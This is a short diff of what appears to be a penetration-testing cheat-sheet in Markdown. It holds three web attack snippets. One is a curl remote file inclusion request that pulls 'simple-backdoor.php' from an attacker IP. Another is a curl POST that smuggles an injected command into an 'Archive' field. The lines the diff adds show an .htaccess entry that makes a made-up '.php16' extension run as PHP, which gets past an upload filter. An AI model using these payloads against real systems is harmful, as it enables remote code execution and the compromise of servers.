@@ -133,3 +133,9 @@ curl "https://example.com/index.php?page=http://192.168.119.3/simple-backdoor.ph
 ```bash
 curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
 ```
+---
+# Upload ".htaccess" file to exploit bypass
+```bash
+# cat .htaccess
+AddType application/x-httpd-php .php16
+```
